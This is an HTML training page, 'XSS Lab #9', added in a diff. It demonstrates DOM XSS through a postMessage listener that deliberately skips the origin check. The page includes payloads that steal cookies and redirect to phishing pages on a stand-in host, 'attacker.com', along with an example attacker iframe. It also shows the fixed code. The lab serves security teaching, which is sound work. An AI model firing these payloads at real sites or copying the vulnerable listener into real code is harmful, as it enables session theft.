@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Lab #9: DOM XSS via postMessage</title>
+    <link rel="stylesheet" href="style/style_lab/style.css">
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>XSS Security Lab</h1>
+        <p class="tagline">DOM-based XSS Demonstration</p>
+        <p class="author">Test Your Knowledge</p>
+    </div>
+
+    <div class="lab-card">
+        <div class="badge">VULNERABLE - DOM XSS via postMessage</div>
+        <h2 style="color: #facc15;">Lab #9: Cross-Origin Messaging Gone Wrong</h2>
+        <p class="subtitle">"Messages from anywhere are welcome here" — even malicious ones</p>
+
+        <div class="description">
+            <p>
+                Modern web applications often use <code>window.postMessage</code> to enable
+                communication between different windows, iframes, or tabs. It's a powerful API
+                that allows cross-origin messaging, but it comes with a critical responsibility:
+                <strong>always verify the origin of incoming messages</strong>.
+            </p>
+            <p>
+                This lab features a live chat widget that listens for messages via
+                <code>postMessage</code> and renders them directly into the page using
+                <code>innerHTML</code> — without checking where the message came from.
+                Any website you visit can send a malicious message to this widget, leading
+                to full DOM XSS. This is exactly how several real-world vulnerabilities
+                have been discovered.
+            </p>
+            <p>
+                <strong>Attack Scenario:</strong> Imagine you're logged into a banking app that
+                uses a vulnerable chat widget. You open a new tab and visit an attacker's site.
+                That site silently sends a postMessage to the banking tab, triggering XSS and
+                stealing your session token — all without you knowing.
+            </p>
+        </div>
+
+        <div class="vulnerable-section">
+            <div class="section-label">VULNERABLE COMPONENT - Chat Widget Message Listener</div>
+
+            <div style="display:flex; gap:15px; flex-wrap:wrap;">
+                <!-- Live Chat Widget -->
+                <div style="flex:1; min-width:300px;">
+                    <div style="background:#1a1a2e; border-radius:8px; overflow:hidden;">
+                        <div style="background:#16213e; padding:12px; border-bottom:2px solid #0f3460;">
+                            <strong>Live Support Chat</strong>
+                            <span style="float:right; font-size:0.8em; color:#4ade80;">Online</span>
+                        </div>
+                        <div id="chatMessages" style="height:300px; overflow-y:auto; padding:12px; background:#0a0a1a;">
+                            <div style="color:#888; text-align:center; margin:20px 0;">
+                                <em>Chat messages will appear here...</em>
+                            </div>
+                            <div style="margin-bottom:8px; color:#888; font-size:0.85em;">
+                                <span style="color:#666;">System:</span> Widget listening for messages...
+                            </div>
+                        </div>
+                        <div style="padding:10px; background:#16213e; border-top:1px solid #0f3460;">
+                            <input type="text" id="chatInput" placeholder="Type a message..." 
+                                style="width:100%; padding:8px; border-radius:4px; border:1px solid #444; background:#1e1e1e; color:#eee;"
+                                onkeypress="if(event.key==='Enter')sendLocalMessage()">
+                            <button onclick="sendLocalMessage()" style="margin-top:5px; width:100%; padding:8px; background:#0f3460; color:#eee; border:none; border-radius:4px; cursor:pointer;">
+                                Send Message
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Attacker Simulator -->
+                <div style="flex:1; min-width:300px;">
+                    <div style="background:#1a1a2e; border-radius:8px; overflow:hidden;">
+                        <div style="background:#3a0a0a; padding:12px; border-bottom:2px solid #ff4444;">
+                            <strong>Attacker Site Simulator</strong>
+                            <span style="float:right; font-size:0.8em; color:#ff4444;">Malicious Page</span>
+                        </div>
+                        <div style="padding:12px; background:#1a0a0a;">
+                            <p style="font-size:0.9em; color:#ff8888; margin-bottom:12px;">
+                                This simulates a malicious website sending a postMessage to the vulnerable chat widget.
+                                In reality, this could be any site you visit in another tab.
+                            </p>
+                            <label style="color:#ff8888; font-size:0.85em;">Craft your XSS payload:</label>
+                            <textarea id="attackPayload" rows="4" style="width:100%; padding:8px; border-radius:4px; border:1px solid #ff4444; background:#2a0a0a; color:#ff8888; font-family:monospace; margin:5px 0; resize:vertical;">{"type":"message","user":"Attacker","text":"<img src=x onerror=alert('XSS via postMessage!')>"}</textarea>
+                            <button onclick="simulateAttack()" style="width:100%; padding:8px; background:#ff4444; color:#fff; border:none; border-radius:4px; cursor:pointer; margin-bottom:8px;">
+                                Launch postMessage Attack
+                            </button>
+                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px;">
+                                <button onclick="loadPresetPayload('alert')" style="padding:6px; background:#2a0a0a; color:#ff8888; border:1px solid #ff4444; border-radius:4px; cursor:pointer; font-size:0.8em;">
+                                    Alert Payload
+                                </button>
+                                <button onclick="loadPresetPayload('cookie')" style="padding:6px; background:#2a0a0a; color:#ff8888; border:1px solid #ff4444; border-radius:4px; cursor:pointer; font-size:0.8em;">
+                                    Steal Cookie
+                                </button>
+                                <button onclick="loadPresetPayload('redirect')" style="padding:6px; background:#2a0a0a; color:#ff8888; border:1px solid #ff4444; border-radius:4px; cursor:pointer; font-size:0.8em;">
+                                    Redirect
+                                </button>
+                                
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Real Attack Code -->
+                    <div style="margin-top:15px; background:#1a1a2e; border-radius:8px; overflow:hidden;">
+                        <div style="background:#16213e; padding:10px; border-bottom:1px solid #0f3460;">
+                            <strong>Real Attacker HTML Code:</strong>
+                        </div>
+                        <pre style="margin:0; padding:12px; background:#0a0a1a; color:#ff8888; font-size:0.8em; overflow-x:auto;"><code id="attackCode">&lt;!-- Attacker's website (attacker.com) --&gt;
+&lt;iframe id="victim" src="http://victim.com/lab9.html"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  // Wait for iframe to load, then attack
+  setTimeout(() =&gt; {
+    document.getElementById('victim')
+      .contentWindow.postMessage(
+        '{"type":"message","user":"System","text":"&lt;img src=x onerror=alert(1)&gt;"}',
+        '*'  // Send to any origin
+      );
+  }, 2000);
+&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Message Origin Check Status -->
+            <div style="margin-top:15px; padding:10px; background:#1a1a1a; border-radius:6px; border-left:4px solid #ff4444;">
+                <strong>Last Message Origin Check:</strong>
+                <span id="originStatus" style="color:#ff4444;">NO ORIGIN VERIFICATION!</span>
+                <br><small style="color:#888;">Event origin: <code id="lastOrigin">none</code></small>
+                <br><small style="color:#888;">Trusted origins: <code id="trustedOrigins">(no check performed)</code></small>
+            </div>
+
+            <div style="margin-top:12px; padding:10px; background:#1a1a1a; border-radius:6px;">
+                <strong>Raw postMessage Data:</strong>
+                <pre id="rawMessageData" style="margin:5px 0 0 0; padding:8px; background:#0a0a0a; color:#facc15; font-size:0.85em; overflow-x:auto;">No message received yet...</pre>
+            </div>
+
+            <pre style="margin-top:16px; background:#111; padding:12px; border-radius:6px; overflow-x:auto; color:#f88;"><code>// VULNERABLE CODE - No origin check!
+window.addEventListener('message', function(event) {
+    // VULNERABILITY: Accepting messages from ANY origin
+    // Missing: if (event.origin !== "https://trusted.com") return;
+    
+    try {
+        var data = JSON.parse(event.data);
+        
+        // Renders user-controlled data directly into innerHTML
+        document.getElementById('chatMessages').innerHTML += 
+            '&lt;div class="message"&gt;' +
+            '&lt;strong&gt;' + data.user + ':&lt;/strong&gt; ' +
+            data.text +   // &lt;-- XSS! No sanitization
+            '&lt;/div&gt;';
+            
+    } catch(e) {
+        // Even non-JSON messages are rendered!
+        document.getElementById('chatMessages').innerHTML += 
+            '&lt;div style="color:#888;"&gt;' + event.data + '&lt;/div&gt;';
+    }
+});
+
+// Real-world scenario: This widget could be embedded in a banking app,
+// admin panel, or any application that uses cross-window messaging.</code></pre>
+        </div>
+
+        <button onclick="toggleSolution()" id="solutionBtn" class="btn-success" style="width:100%;">
+            Show Solution & Fix
+        </button>
+
+        <div class="solution-panel" id="solutionPanel">
+            <h3 style="color:#4ade80;">The Fix - Proper postMessage Security</h3>
+            
+            <h4>1. Always Validate event.origin</h4>
+            <pre style="background:#111; padding:12px; border-radius:6px; overflow-x:auto; color:#4ade80;"><code>// FIXED CODE - Origin validation
+window.addEventListener('message', function(event) {
+    // STEP 1: Whitelist trusted origins
+    const trustedOrigins = [
+        'https://myapp.com',
+        'https://trusted-partner.com'
+    ];
+    
+    if (!trustedOrigins.includes(event.origin)) {
+        console.warn('Rejected message from untrusted origin:', event.origin);
+        return; // Block messages from unknown sources
+    }
+    
+    // STEP 2: Validate the data structure
+    try {
+        var data = JSON.parse(event.data);
+        
+        // Ensure expected properties exist
+        if (!data.type || !data.user || !data.text) {
+            return; // Invalid message format
+        }
+        
+        // STEP 3: Use textContent instead of innerHTML
+        const messageDiv = document.createElement('div');
+        messageDiv.className = 'message';
+        
+        const userSpan = document.createElement('strong');
+        userSpan.textContent = data.user + ': '; // Safe: rendered as text
+        
+        const textNode = document.createTextNode(data.text); // Safe: always text
+        
+        messageDiv.appendChild(userSpan);
+        messageDiv.appendChild(textNode);
+        
+        document.getElementById('chatMessages').appendChild(messageDiv);
+        
+    } catch(e) {
+        // Even error cases should be handled safely
+        console.error('Invalid message format');
+    }
+});</code></pre>
+
+            <h4>2. Additional Security Measures</h4>
+            <ul style="margin-left:20px; line-height:1.8;">
+                <li><strong>Use event.source verification:</strong> Check that <code>event.source</code>
+                    matches the expected window reference (e.g., <code>event.source === iframe.contentWindow</code>).</li>
+                <li><strong>Implement message validation:</strong> Verify the structure and types of incoming
+                    data. Use a schema validator or at minimum check for expected properties.</li>
+                <li><strong>Always use textContent:</strong> When inserting user-controlled data into the DOM,
+                    <code>textContent</code> is always safer than <code>innerHTML</code>.</li>
+                <li><strong>Apply Content Security Policy:</strong> A strong CSP can prevent XSS even if
+                    postMessage validation fails. Include <code>script-src 'self'</code> as a minimum.</li>
+                <li><strong>Use X-Frame-Options:</strong> If your app shouldn't be framed, set
+                    <code>X-Frame-Options: DENY</code> to prevent clickjacking + postMessage attacks.</li>
+                <li><strong>Sandbox untrusted iframes:</strong> If you must embed untrusted content, use
+                    the <code>sandbox</code> attribute without <code>allow-same-origin</code>.</li>
+            </ul>
+
+            <h4>3. Testing the Fix</h4>
+            <div style="margin-top:12px;">
+                <label style="display:flex; align-items:center; gap:8px; cursor:pointer;">
+                    <input type="checkbox" id="enableFix" onchange="toggleFix()">
+                    <span style="color:#4ade80;">Enable origin validation (see the fix in action)</span>
+                </label>
+            </div>
+            <div id="fixStatus" style="margin-top:8px; padding:8px; background:#1a1a1a; border-radius:4px; color:#888;">
+                Fix is currently <strong style="color:#ff4444;">DISABLED</strong> - Vulnerable mode active
+            </div>
+
+            <h4 style="margin-top:20px;">Real-World Examples</h4>
+            <p>These techniques have been found in production apps:</p>
+            <ul style="margin-left:20px; line-height:1.8;">
+                <li><strong>2018 - YouTube:</strong> postMessage XSS allowed attackers to modify video descriptions</li>
+                <li><strong>2020 - Shopify:</strong> Missing origin check in partner dashboard chat widget</li>
+                <li><strong>2021 - Multiple Crypto Exchanges:</strong> TradingView widget postMessage vulnerabilities</li>
+                <li><strong>2022 - Browser Extensions:</strong> postMessage listeners without origin checks in Chrome extensions</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="button-container">
+        <button class="nav-btn btn-home" onclick="window.location.href='index.html'">
+            <span class="btn-icon"></span> Back to Home
+        </button>
+        <button class="nav-btn btn-prev" onclick="window.location.href='lab6.html'">
+            <span class="btn-icon">&#8592;</span> Previous Lab
+        </button>
+        <button class="nav-btn btn-next" onclick="window.location.href='final.html'">
+            Celebrating   <span class="btn-icon">&#8594;</span>
+        </button>
+    </div>
+
+    <div class="footer">
+        
+    </div>
+</div>
+
+<script>
+    let fixEnabled = false;
+    let messageCount = 0;
+
+    // ============ VULNERABLE MESSAGE LISTENER ============
+    window.addEventListener('message', function(event) {
+        messageCount++;
+        
+        // Update monitoring displays
+        document.getElementById('lastOrigin').textContent = event.origin;
+        document.getElementById('rawMessageData').textContent = 
+            typeof event.data === 'string' ? event.data : JSON.stringify(event.data, null, 2);
+        
+        if (fixEnabled) {
+            // ===== FIXED VERSION =====
+            const trustedOrigins = ['https://myapp.com', window.location.origin];
+            
+            if (!trustedOrigins.includes(event.origin)) {
+                document.getElementById('originStatus').innerHTML = 
+                    '<span style="color:#ff4444;">BLOCKED - Untrusted origin: ' + event.origin + '</span>';
+                document.getElementById('trustedOrigins').textContent = trustedOrigins.join(', ');
+                return;
+            }
+            
+            document.getElementById('originStatus').innerHTML = 
+                '<span style="color:#4ade80;">ALLOWED - Trusted origin: ' + event.origin + '</span>';
+            document.getElementById('trustedOrigins').textContent = trustedOrigins.join(', ');
+            
+            // Safe message handling
+            try {
+                var data = JSON.parse(event.data);
+                if (!data.text) return;
+                
+                const msgDiv = document.createElement('div');
+                msgDiv.style.marginBottom = '8px';
+                
+                const userStrong = document.createElement('strong');
+                userStrong.style.color = '#4ade80';
+                userStrong.textContent = (data.user || 'Unknown') + ': ';
+                
+                const textNode = document.createTextNode(data.text);
+                
+                msgDiv.appendChild(userStrong);
+                msgDiv.appendChild(textNode);
+                document.getElementById('chatMessages').appendChild(msgDiv);
+                
+            } catch(e) {
+                // Safely handle non-JSON messages
+                const msgDiv = document.createElement('div');
+                msgDiv.style.color = '#888';
+                msgDiv.textContent = event.data;
+                document.getElementById('chatMessages').appendChild(msgDiv);
+            }
+            
+        } else {
+            // ===== VULNERABLE VERSION =====
+            document.getElementById('originStatus').innerHTML = 
+                '<span style="color:#ff4444;">NO ORIGIN CHECK - Message accepted from: ' + event.origin + '</span>';
+            document.getElementById('trustedOrigins').textContent = '(no check performed - accepting all origins)';
+            
+            try {
+                // Try to parse as JSON first
+                var data = JSON.parse(event.data);
+                document.getElementById('chatMessages').innerHTML += 
+                    '<div style="margin-bottom:8px;">' +
+                    '<strong style="color:#4ade80;">' + data.user + ':</strong> ' +
+                    data.text +  // VULNERABLE: Direct innerHTML insertion
+                    '</div>';
+            } catch(e) {
+                // Non-JSON message - ALSO VULNERABLE
+                document.getElementById('chatMessages').innerHTML += 
+                    '<div style="color:#888;">' + event.data + '</div>';
+            }
+        }
+        
+        // Auto-scroll chat
+        const chatDiv = document.getElementById('chatMessages');
+        chatDiv.scrollTop = chatDiv.scrollHeight;
+    });
+
+    // ============ LOCAL MESSAGE SENDING ============
+    function sendLocalMessage() {
+        const input = document.getElementById('chatInput');
+        const text = input.value.trim();
+        if (!text) return;
+        
+        // Send message to self (simulates receiving from current window)
+        const message = JSON.stringify({
+            type: 'message',
+            user: 'You',
+            text: text
+        });
+        
+        window.postMessage(message, '*');
+        input.value = '';
+    }
+
+    // ============ ATTACKER SIMULATION ============
+    function simulateAttack() {
+        const payload = document.getElementById('attackPayload').value;
+        try {
+            // Parse to validate JSON, then stringify to clean it
+            const cleanPayload = JSON.stringify(JSON.parse(payload));
+            window.postMessage(cleanPayload, '*');
+        } catch(e) {
+            // If invalid JSON, send as raw string (still demonstrates vulnerability)
+            window.postMessage(payload, '*');
+        }
+        
+        // Update the attacker code display
+        updateAttackCodeDisplay();
+    }
+
+    function loadPresetPayload(type) {
+        const payloads = {
+            alert: '{"type":"message","user":"Hacker","text":"<img src=x onerror=alert(\'XSS via postMessage!\')>"}',
+            cookie: '{"type":"message","user":"Hacker","text":"<img src=x onerror=fetch(\'https://attacker.com/steal?c=\'+document.cookie)>"}',
+            redirect: '{"type":"message","user":"Hacker","text":"<img src=x onerror=location=\'https://attacker.com/phishing\' >"}',
+            
+        };
+        
+        document.getElementById('attackPayload').value = payloads[type] || '';
+    }
+
+    function updateAttackCodeDisplay() {
+        const payload = document.getElementById('attackPayload').value;
+        let escapedPayload;
+        try {
+            escapedPayload = JSON.stringify(JSON.parse(payload));
+        } catch(e) {
+            escapedPayload = payload;
+        }
+        
+        document.getElementById('attackCode').innerHTML = 
+            `&lt;!-- Attacker's website (attacker.com) --&gt;
+&lt;iframe id="victim" src="http://victim.com/lab9.html"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  // Wait for iframe to load, then attack
+  setTimeout(() =&gt; {
+    document.getElementById('victim')
+      .contentWindow.postMessage(
+        '${escapedPayload}',
+        '*'  // Send to any origin
+      );
+  }, 2000);
+&lt;/script&gt;`;
+    }
+
+    // ============ FIX TOGGLE ============
+    function toggleFix() {
+        fixEnabled = document.getElementById('enableFix').checked;
+        const statusDiv = document.getElementById('fixStatus');
+        
+        if (fixEnabled) {
+            statusDiv.innerHTML = 'Fix is currently <strong style="color:#4ade80;">ENABLED</strong> - Origin validation active';
+        } else {
+            statusDiv.innerHTML = 'Fix is currently <strong style="color:#ff4444;">DISABLED</strong> - Vulnerable mode active';
+        }
+    }
+
+    // ============ UTILITY FUNCTIONS ============
+    function toggleSolution() {
+        const panel = document.getElementById('solutionPanel');
+        const btn = document.getElementById('solutionBtn');
+        if (panel.classList.contains('show')) {
+            panel.classList.remove('show');
+            btn.textContent = 'Show Solution & Fix';
+        } else {
+            panel.classList.add('show');
+            btn.textContent = 'Hide Solution & Fix';
+        }
+    }
+
+    // ============ INITIALIZATION ============
+    window.addEventListener('DOMContentLoaded', () => {
+        // Display a welcome message using postMessage (from same origin, so it's "safe")
+        const welcomeMsg = JSON.stringify({
+            type: 'message',
+            user: 'System',
+            text: 'Welcome! This chat widget accepts messages from ANY origin. Try sending XSS payloads via postMessage!'
+        });
+        
+        // Using setTimeout to ensure listener is ready
+        setTimeout(() => {
+            window.postMessage(welcomeMsg, '*');
+        }, 500);
+
+        // Load default payload
+        loadPresetPayload('alert');
+        updateAttackCodeDisplay();
+    });
+
+    // Log any postMessage received from other origins for demonstration
+    console.log('%cThis page listens for postMessage from ANY origin - XSS may be possible!', 
+                'color: red; font-size: 16px; font-weight: bold;');
+    console.log('%cTry running in the console:', 'color: yellow;');
+    console.log('%cwindow.postMessage(\'{"type":"message","user":"Hacker","text":"<img src=x onerror=alert(1)>"}\', \'*\')', 
+                'color: orange; font-family: monospace;');
+</script>
+</body>
+</html>
